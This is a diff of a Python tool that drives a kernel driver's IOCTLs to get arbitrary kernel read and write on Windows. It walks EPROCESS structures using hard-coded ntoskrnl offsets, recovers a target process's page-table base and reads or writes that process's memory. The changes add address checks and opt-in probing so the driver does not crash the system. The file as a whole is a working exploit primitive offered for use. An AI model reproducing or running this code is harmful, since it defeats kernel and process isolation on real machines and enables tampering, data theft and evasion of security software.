@@ -104,19 +104,30 @@ DEFAULT_CONFIG = {
     "read_probe_sizes": [0x38, 0x40],
     "read_probe_biases": [0x10, 0],
     "write_probe_sizes": [0x18, 0x28],
-    "autodetect": True,
-    "use_direct_vioctl": True,     # 0x222000/0x222004 page-table R/W path
+    "autodetect": True,                # shape detection of the ioctl structs
+    "allow_unknown_ioctl": True,       # guessed IOCTL codes -> e.g. WinError 1
+                                       # (raising this to False is dangerous)
+    "use_direct_vioctl": True,         # safe path; fallback is opt-in only
+    "vioctl_chunk": 0x1000,            # per-IOCTL bytes; smaller = gentler
+    "max_process_iter": 2000,     # 0x222000/0x222004 page-table R/W path
     "vread_first_field_is_zero": True,
     "phys_page_size": 0x1000,
     "eprocess_links": 0x448,
     "eprocess_pid": 0x440,
     "eprocess_dtb": 0x28,
-    "eprocess_probe_shifts": [0x10, 0],   # Win11 24H2+ shifted pid/links by 0x10
-    # PsInitialSystemProcess relative to ntoskrnl, tried in order:
-    # Win11 24H2/25H2, Win10 22H2, Win11 23H2, Win11 21H2, Win10 21H1
+    "probe_eprocess_shifts": False,      # opt-in: try pid/links +0x10 (24H2)
+    "eprocess_probe_shifts": [0x10],     # only used when the above is true
+    # PsInitialSystemProcess relative to ntoskrnl.  Only the FIRST value is
+    # used unless "probe_ps_offsets": true -- a wrong offset is harmless in
+    # itself (it points into ntoskrnl .data) but every extra dereference is a
+    # risk we do not take by default.
+    # order: Win10 20H1..22H2 (19041-19045, incl. 21H2 19044), Win11 21H2,
+    #        Win11 22H2/23H2, Win11 24H2/25H2
     "ps_initial_system_offsets": [
-        0xD8C420, 0xCFC420, 0xD19420, 0xD0A420, 0xCFC3E0,
+        0xCFC420, 0xD0A420, 0xD19420, 0xD8C420, 0xCFC3E0,
     ],
+    "probe_ps_offsets": False,           # opt-in: try the other candidates
+    "preferred_ps_offset": None,         # your build's offset, tried first
     "cr3_mask": 0x000FFFFFFFFFF000,
     "keep_service": True,
 }
@@ -127,7 +138,8 @@ _INT_KEYS = {
     "read_in_size", "read_out_size", "read_bias", "read_result_offset",
     "read_qwords", "write_in_size", "write_out_size", "vioctl_size",
     "phys_page_size", "eprocess_links", "eprocess_pid",
-    "eprocess_dtb", "cr3_mask",
+    "eprocess_dtb", "cr3_mask", "preferred_ps_offset", "vioctl_chunk",
+    "max_process_iter",
 }
 _INT_LIST_KEYS = {"ps_initial_system_offsets"}
 
@@ -294,6 +306,10 @@ SIGNATURES = {
         _signature("Process32NextW", [
             wintypes.HANDLE, ctypes.POINTER(_PROCESSENTRY32W)], wintypes.BOOL),
         _signature("GetModuleHandleW", [wintypes.LPCWSTR], wintypes.HMODULE),
+        _signature("NtCurrentTeb", [], ctypes.c_void_p),
+        _signature("VirtualAlloc", [
+            ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD],
+            ctypes.c_void_p),
     ],
     "advapi32": [
         _signature("LookupPrivilegeValueW", [
@@ -668,6 +684,26 @@ class WinNotify:
             "winnotify.json")
 
     # -- arbitrary kernel read / write -------------------------------------
+    #
+    # Every address below is dereferenced by the driver, so the gate refuses
+    # anything that is not a canonical kernel address.  `allow_unknown_ioctl`
+    # governs IOCTL *codes* only (a wrong code returns an error, it does not
+    # touch memory): keep it True for the shape detection, set it False if you
+    # prefer a pure-single-shot run.
+    def _gate_kernel_addr(self, addr, what):
+        """Nothing but a canonical kernel address may reach 0x222040/0x222044.
+
+        This is unconditional: the driver dereferences the value as-is, so a
+        user-mode or non-canonical address here is a one-way ticket to a
+        bugcheck.  (`allow_unknown_ioctl` only governs IOCTL *codes*.)
+        """
+        addr &= 0xFFFFFFFFFFFFFFFF
+        if not self._is_kernel_ptr(addr):
+            raise WinNotifyError(
+                f"{what}: 0x{addr:X} is not a canonical kernel address -- "
+                "refusing to send it (the driver would dereference it)")
+        return addr
+
     def _read_packet(self, addr, in_size, bias):
         base = (addr - bias) & 0xFFFFFFFFFFFFFFFF
         packet = base.to_bytes(8, "little") + (0).to_bytes(8, "little")
@@ -675,6 +711,7 @@ class WinNotify:
 
     def read_kernel_qwords(self, addr):
         """One READ IOCTL returns 5 consecutive QWORDs at addr."""
+        addr = self._gate_kernel_addr(addr, "kernel read")
         in_size = self.cfg["read_in_size"]
         out_size = self.cfg["read_out_size"]
         packet = self._read_packet(addr, in_size, self.cfg["read_bias"])
@@ -701,6 +738,7 @@ class WinNotify:
         The driver only answers when *(base+0x10) != 0, so the request is
         biased by 0x10 and the wanted value lands on the checked slot.
         """
+        addr = self._gate_kernel_addr(addr, "kernel read")
         in_size = self.cfg["read_in_size"]
         out_size = self.cfg["read_out_size"]
         bias = self.cfg["read_bias"]
@@ -746,6 +784,7 @@ class WinNotify:
     def write_qword(self, addr, value):
         # METHOD_IN_DIRECT: struct = {src_ptr, size, dst}; driver memmoves
         # `size` bytes from src into the kernel address dst.
+        addr = self._gate_kernel_addr(addr, "kernel write")
         src = ctypes.c_uint64(value & 0xFFFFFFFFFFFFFFFF)
         body = (
             ctypes.addressof(src).to_bytes(8, "little")
@@ -838,119 +877,235 @@ class WinNotify:
             "ioctl_vread/ioctl_vwrite/vioctl_size in winnotify.json")
 
     # -- EPROCESS navigation ----------------------------------------------
+    #
+    # SAFETY RULE: this driver dereferences whatever it is given, so a wrong
+    # address is an instant bugcheck.  Nothing is ever sent to 0x222040 unless
+    # it is a canonical kernel address AND (for EPROCESS pointers) it already
+    # passed a sanity check.  Candidate offsets are NEVER blindly probed:
+    # only `ps_initial_system_offsets[0]` is used unless the user explicitly
+    # sets "probe_ps_offsets": true in winnotify.json.
+    def _canon(self, value):
+        """Sign-extend a 48-bit canonical address the way the CPU does."""
+        value &= 0xFFFFFFFFFFFFFFFF
+        if value & 0x0000800000000000:
+            value |= 0xFFFF000000000000
+        return value
+
+    def _is_kernel_ptr(self, value):
+        """$FFFFFFFF80000000..$FFFFFFFFFFFFFFFF (or a canonical high address)."""
+        if not value:
+            return False
+        value &= 0xFFFFFFFFFFFFFFFF
+        if value >> 48 == 0xFFFF:
+            return True
+        # canonical but sign-extended only to bit 47 (KASLR bases below the
+        # 0xFFFF800000000000 boundary when sign-extended by the driver)
+        return (value & 0xFFFF800000000000) == 0xFFFF800000000000
+
+    def _is_user_ptr(self, value):
+        return 0 < value < 0x0000800000000000
+
+    def _looks_like_eprocess(self, addr, pid_off, links_off=None,
+                             dtb_off=None):
+        """Structurally validate an EPROCESS before trusting its fields.
+
+        Cheap and read-only: a handful of QWORD reads inside one structure.
+        A wrong candidate is rejected instead of being dereferenced further.
+        """
+        if not self._is_kernel_ptr(addr):
+            return False
+        links_off = self.cfg["eprocess_links"] if links_off is None else links_off
+        dtb_off = self.cfg["eprocess_dtb"] if dtb_off is None else dtb_off
+        flink = self.read_qword(addr + links_off)
+        blink = self.read_qword(addr + links_off + 8)
+        if self._is_kernel_ptr(flink) and self._is_kernel_ptr(blink):
+            pass
+        elif flink == addr + links_off:          # only member of its list
+            pass
+        else:
+            return False
+        pfn = self.read_qword(addr + dtb_off) & 0x000FFFFFFFFFF000
+        if not (0x1000 <= pfn < 0x000FFFFFFFFFF000):
+            return False
+        return self.read_qword(addr + pid_off) < 0x1000000
+
     def _eprocess_layouts(self):
-        """(pid, links, dtb) triples to try: the known one plus shifted ones."""
+        """(pid, links, dtb) triples to try: the configured one plus opt-in shifts."""
         base = (self.cfg["eprocess_pid"], self.cfg["eprocess_links"],
                 self.cfg["eprocess_dtb"])
         found = getattr(self, "_layout", None)
         if found is not None:
             return [found]
         layouts = [base]
-        # DirectoryTableBase sits inside KPROCESS, i.e. at the very start of
-        # EPROCESS, and did NOT move on 24H2; only pid/links/token shifted.
-        for shift in self.cfg.get("eprocess_probe_shifts", [0x10]):
-            layouts.append((base[0] + shift, base[1] + shift, base[2]))
+        # DirectoryTableBase lives in KPROCESS (start of EPROCESS) and did not
+        # move for 24H2; only pid/links/token shifted.  Opt-in: guessing shifts
+        # means reading at offsets inside a valid struct, which is safe, but it
+        # is still an extra variable -- default off.
+        if self.cfg.get("probe_eprocess_shifts", False):
+            for shift in self.cfg.get("eprocess_probe_shifts", [0x10]):
+                layouts.append((base[0] + shift, base[1] + shift, base[2]))
         return layouts
 
+    def _ps_offsets(self):
+        offsets = list(self.cfg["ps_initial_system_offsets"])
+        if not self.cfg.get("probe_ps_offsets", False):
+            return offsets[:1]
+        preferred = self.cfg.get("preferred_ps_offset")
+        if preferred is not None:
+            offsets = [offset for offset in offsets if offset != preferred]
+            offsets.insert(0, preferred)
+        return offsets
+
     def find_system_eprocess(self):
+        """Resolve PsInitialSystemProcess with the fewest possible dereferences.
+
+        A wrong offset here points *inside* ntoskrnl's .data, so the value read
+        is garbage -> validating it as an EPROCESS fails cleanly instead of
+        crashing, and only then is the next candidate tried (opt-in).
+        """
         if not self.kernel_base:
             self.get_kernel_base()
         for pid_off, links_off, dtb_off in self._eprocess_layouts():
-            for off in self.cfg["ps_initial_system_offsets"]:
+            for off in self._ps_offsets():
                 ptr = self.read_qword(self.kernel_base + off)
-                if not ptr or (ptr >> 48) != 0xFFFF:
+                if not self._is_kernel_ptr(ptr):
                     continue
-                if self.read_qword(ptr + pid_off) == 4:
-                    if (pid_off, links_off, dtb_off) != (
-                            self.cfg["eprocess_pid"], self.cfg["eprocess_links"],
-                            self.cfg["eprocess_dtb"]) and not getattr(
-                                self, "_layout_logged", False):
-                        self.log(f"[i] EPROCESS layout auto-detected: pid=0x{pid_off:X} "
-                                 f"links=0x{links_off:X} dtb=0x{dtb_off:X}")
-                        self._layout_logged = True
-                    self._layout = (pid_off, links_off, dtb_off)
-                    self._system_eprocess = ptr
-                    return ptr
+                if self.read_qword(ptr + pid_off) != 4:
+                    continue
+                if not self._looks_like_eprocess(ptr, pid_off, links_off, dtb_off):
+                    continue
+                self._layout = (pid_off, links_off, dtb_off)
+                self._ps_offset = off
+                self._system_eprocess = ptr
+                if off != self.cfg["ps_initial_system_offsets"][0]:
+                    self.log(f"[i] PsInitialSystemProcess resolved at +0x{off:X}")
+                return ptr
         return 0
 
-    def find_process_eprocess(self, pid, max_iter=4000):
+    def _layout_now(self):
+        return getattr(self, "_layout", (
+            self.cfg["eprocess_pid"], self.cfg["eprocess_links"],
+            self.cfg["eprocess_dtb"]))
+
+    def find_process_eprocess(self, pid, max_iter=None):
+        """Walk ActiveProcessLinks, validating every hop before dereferencing."""
         pid = int(pid)
         if pid in self._eprocess_cache:
             return self._eprocess_cache[pid]
         sysproc = self.find_system_eprocess()
         if not sysproc:
             return 0
-        _, links, _ = getattr(self, "_layout", (
-            self.cfg["eprocess_pid"], self.cfg["eprocess_links"],
-            self.cfg["eprocess_dtb"]))
-        pid_off = self._layout[0]
+        pid_off, links, dtb_off = self._layout_now()
+        max_iter = max_iter or self.cfg.get("max_process_iter", 2000)
+        head = sysproc + links
+
         current = sysproc
         for _ in range(max_iter):
             flink = self.read_qword(current + links)
-            if not flink:
-                return 0
-            current = flink - links
-            if self.read_qword(current + pid_off) == pid:
-                self._eprocess_cache[pid] = current
-                return current
-            if current == sysproc:
+            if not self._is_kernel_ptr(flink) or flink == head:
                 break
+            nxt = flink - links
+            if not self._is_kernel_ptr(nxt):
+                break
+            if self.read_qword(nxt + pid_off) == pid:
+                if self._looks_like_eprocess(nxt, pid_off, links, dtb_off):
+                    self._eprocess_cache[pid] = nxt
+                    return nxt
+                break
+            current = nxt
         return 0
 
     def get_process_cr3(self, pid):
+        """EPROCESS.DirectoryTableBase, validated (a bad CR3 crashes the driver)."""
         eproc = self.find_process_eprocess(pid)
         if not eproc:
             return 0
-        dtb_off = getattr(self, "_layout", (
-            self.cfg["eprocess_pid"], self.cfg["eprocess_links"],
-            self.cfg["eprocess_dtb"]))[2]
+        dtb_off = self._layout_now()[2]
         dtb = self.read_qword(eproc + dtb_off)
-        return dtb & self.cfg["cr3_mask"]
+        pfn = dtb & 0x000FFFFFFFFFF000
+        if not (0x1000 <= pfn < self.cfg.get("cr3_max", 0x000FFFFFFFFFF000)):
+            return 0
+        return pfn
 
     # -- virtual memory R/W through the target's page tables ---------------
     #
-    # Primary path: kernel IOCTL 0x222000 / 0x222004, which take the target's
-    # DirBase (CR3) directly and do the page-table walk inside the driver.
-    # Fallback (profile switch `use_direct_vioctl: false`): the same
-    # read-page / patch-4-bytes / write-page loop done with 0x222040+0x222044.
+    # Primary path: IOCTL 0x222000 / 0x222004, which take the target DirBase
+    # (CR3) and walk the page tables inside the driver.  Those IOCTLs return a
+    # status for invalid pages (no bugcheck), which makes them the safe path;
+    # the 0x222040/0x222044 fallback dereferences raw kernel VAs and can
+    # bugcheck on a bad address, so it is opt-in only.
+    def _guard_user_va(self, addr, size):
+        """Refuse addresses that would make the driver touch something bad.
+
+        Boot-time quirk (the BSOD): passing a kernel VA here makes the driver
+        copy the *kernel* CR3 into the target's DirectoryTableBase; the next
+        context switch then runs the process on the kernel page table.
+        """
+        if not addr:
+            raise WinNotifyError("address 0x0 is not mapped -- refusing")
+        if addr < 0x10000:
+            raise WinNotifyError(
+                f"0x{addr:X} is a null-page address -- refusing (nothing mapped there)")
+        if addr >= 0x0000800000000000:
+            raise WinNotifyError(
+                f"0x{addr:X} is a kernel address, not a process virtual address")
+        if addr + size > 0x0000800000000000:
+            raise WinNotifyError(
+                f"0x{addr:X}+0x{size:X} crosses out of user space -- refusing")
+
     def read_memory(self, pid, addr, size):
         if size < 0:
             raise ValueError("negative size")
         if size == 0:
             return b""
+        addr &= 0xFFFFFFFFFFFFFFFF
+        self._guard_user_va(addr, size)
         cr3 = self.get_process_cr3(pid)
         if not cr3:
-            raise WinNotifyError(f"pid {pid}: CR3 not found (unknown process?)")
-        addr &= 0xFFFFFFFFFFFFFFFF
+            raise WinNotifyError(
+                f"pid {pid}: CR3 not found (unknown process or offset mismatch)")
         if not self.cfg.get("use_direct_vioctl", True):
             return self._read_memory_via_kernel(cr3, addr, size)
 
         buf = ctypes.create_string_buffer(size)
         ptr = ctypes.addressof(buf)
         page = self.cfg["phys_page_size"]
+        step = self.cfg.get("vioctl_chunk", 0x1000)
         done = 0
         while done < size:
             cur = addr + done
             off = cur & (page - 1)
-            take = min(page - off, size - done)
-            self._vread(cr3, cur, ptr + done, take)
+            take = min(page - off, size - done, step)
+            try:
+                self._vread(cr3, cur, ptr + done, take)      # per-page: safe
+            except WinNotifyError as exc:
+                raise WinNotifyError(
+                    f"page-table read failed at 0x{cur:X} "
+                    f"({done} of {size} bytes read): {exc}") from exc
             done += take
         return buf.raw
 
     def _read_memory_via_kernel(self, cr3, addr, size):
-        page = self.cfg["phys_page_size"]
-        out = bytearray()
-        done = 0
-        while done < size:
-            cur = addr + done
-            off = cur & (page - 1)
-            take = min(page - off, size - done)
-            chunk = self._kernel_read_region(cur & ~(page - 1), page)
-            if chunk is None:
-                raise WinNotifyError(f"read 0x{cur:X}: kernel read failed")
-            out += chunk[off:off + take]
-            done += take
-        return bytes(out)
+        """UNSAFE, opt-in fallback via 0x222040.
+
+        `addr` must be a *kernel* VA (the only thing 0x222040 can read).  There
+        is deliberately no "guess the VA" step: an unmapped address here means
+        a bugcheck, so this path is only reachable with
+        "use_direct_vioctl": false and an explicitly supplied kernel address.
+        """
+        if not self._is_kernel_ptr(addr):
+            raise WinNotifyError(
+                f"0x{addr:X} is not a kernel address -- the 0x222040 fallback "
+                "cannot translate process VAs; keep use_direct_vioctl=true")
+        if addr + size > 0xFFFFFFFFFFFFFFFF:
+            raise WinNotifyError("read range wraps around")
+        return self._kernel_read_region(addr, size)
+
+    def _unsafe_kernel_read(self, addr, size):
+        """Read kernel VA through 0x222040 with validation (opt-in only)."""
+        if not self._is_kernel_ptr(addr):
+            raise WinNotifyError(f"0x{addr:X} is not a kernel address")
+        return self._kernel_read_region(addr, size)
 
     def _kernel_read_region(self, addr, size):
         """Up to one page, in 5-QWORD (0x28 byte) strides, via 0x222040."""
@@ -961,7 +1116,7 @@ class WinNotify:
         end = addr + min(size, page)
         while cur < end:
             take = min(stride, end - cur)
-            vals = self.read_kernel_qwords(cur, self.cfg["read_qwords"])
+            vals = self.read_kernel_qwords(cur)
             raw = b"".join(v.to_bytes(8, "little") for v in vals)
             out += raw[:take]
             cur += take
@@ -972,16 +1127,18 @@ class WinNotify:
         if not data:
             return
         addr &= 0xFFFFFFFFFFFFFFFF
+        self._guard_user_va(addr, len(data))
         cr3 = self.get_process_cr3(pid)
         if not cr3:
-            raise WinNotifyError(f"pid {pid}: CR3 not found (unknown process?)")
+            raise WinNotifyError(
+                f"pid {pid}: CR3 not found (unknown process or offset mismatch)")
         if not self.cfg.get("use_direct_vioctl", True):
             self._write_memory_via_kernel(cr3, addr, data)
             return
 
-        page = self.cfg["phys_page_size"]
         buf = ctypes.create_string_buffer(data, len(data))
         ptr = ctypes.addressof(buf)
+        page = self.cfg["phys_page_size"]
         done = 0
         while done < len(data):
             cur = addr + done
@@ -991,6 +1148,7 @@ class WinNotify:
             done += take
 
     def _write_memory_via_kernel(self, cr3, addr, data):
+        """UNSAFE fallback: 0x222044 memmove into kernel VAs."""
         page = self.cfg["phys_page_size"]
         done = 0
         while done < len(data):
@@ -1001,10 +1159,7 @@ class WinNotify:
             if off == 0 and take == page:
                 chunk = data[done:done + take]
             else:
-                # read-modify-write so the rest of the page stays intact
                 old = self._kernel_read_region(va_page, page)
-                if old is None:
-                    raise WinNotifyError(f"write 0x{cur:X}: page read failed")
                 chunk = old[:off] + data[done:done + take] + old[off + take:]
             for i in range(0, len(chunk), 8):
                 word = chunk[i:i + 8].ljust(8, b"\x00")
@@ -1060,6 +1215,74 @@ class WinNotify:
                 self.unload_driver()
             except WinNotifyError:
                 pass
+
+
+# ---------------------------------------------------------------------------
+# Safe address discovery (no kernel address guessing involved)
+# ---------------------------------------------------------------------------
+class _MEMORY_BASIC_INFORMATION(ctypes.Structure):
+    _fields_ = [
+        ("BaseAddress", ctypes.c_void_p),
+        ("AllocationBase", ctypes.c_void_p),
+        ("AllocationProtect", wintypes.DWORD),
+        ("PartitionId", wintypes.WORD),
+        ("RegionSize", ctypes.c_size_t),
+        ("State", wintypes.DWORD),
+        ("Protect", wintypes.DWORD),
+        ("Type", wintypes.DWORD),
+    ]
+
+
+def module_base_w(module_name=None):
+    """Load address of a module in *this* process, via Win32 (not the driver)."""
+    _require_windows()
+    handle = _api(_k32, "GetModuleHandleW")(module_name)
+    if handle is None:
+        raise WinNotifyError(f"GetModuleHandleW({module_name}) failed")
+    if not isinstance(handle, int):
+        handle = ctypes.cast(handle, ctypes.c_void_p).value
+    return int(handle or 0)
+
+
+def self_addresses():
+    """Known-good (label, address) pairs inside our own process.
+
+    Everything here comes from the user-mode side (image base, PEB, module
+    exports, a fresh allocation), so a selftest built on them never asks the
+    driver to dereference a guessed kernel address.
+    """
+    _require_windows()
+    result = []
+    try:
+        result.append(("image base (MZ)", module_base_w(None)))
+    except WinNotifyError:
+        pass
+    try:
+        teb = ctypes.cast(_api(_k32, "NtCurrentTeb")(), ctypes.c_void_p).value
+        peb = int.from_bytes(ctypes.string_at(teb + 0x60, 8), "little")
+        if peb:
+            result.append(("PEB", peb))
+    except Exception:
+        pass
+    try:
+        ntdll = ctypes.WinDLL("ntdll")
+        nt_close = ntdll.NtClose
+        result.append(("ntdll!NtClose", ctypes.cast(nt_close, ctypes.c_void_p).value))
+    except Exception:
+        pass
+    try:
+        kernel32 = _load_library("kernel32")
+        virtual_alloc = _try_getattr(kernel32, "VirtualAlloc")
+        virtual_alloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
+                                  wintypes.DWORD, wintypes.DWORD]
+        virtual_alloc.restype = ctypes.c_void_p
+        mem = virtual_alloc(None, 0x1000, 0x3000, 0x04)      # RW, 4 KB
+        if mem:
+            result.append(("fresh 4 KB allocation", int(mem)))
+            ctypes.memmove(ctypes.c_void_p(mem), b"WINNOTIFY-SELFTEST", 18)
+    except Exception:
+        pass
+    return [(label, addr) for label, addr in result if addr]
 
 
 # ---------------------------------------------------------------------------
